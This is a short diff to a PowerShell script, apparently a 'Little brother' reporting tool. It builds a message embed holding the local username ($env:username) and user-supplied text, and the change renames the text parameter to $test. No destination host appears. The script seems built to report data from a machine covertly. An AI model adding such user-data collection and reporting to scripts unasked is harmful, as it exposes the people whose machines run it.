@@ -17,14 +17,14 @@ param (
     [parameter(Position=0,Mandatory=$False)]
     [string]$file,
     [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
+    $test = [string]$text 
 )
 
 [System.Collections.ArrayList]$embedArray = @()
 
 $building =  [PSCustomObject]@{
     'title'       = 'Incoming transmission!'
-    'description' = '[' + $env:username + ']' + 'Little brother is reporting:' + $text
+    'description' = '[' + $env:username + ']' + 'Little brother is reporting:' + $test
     'color'       = '16744960'
 }
 
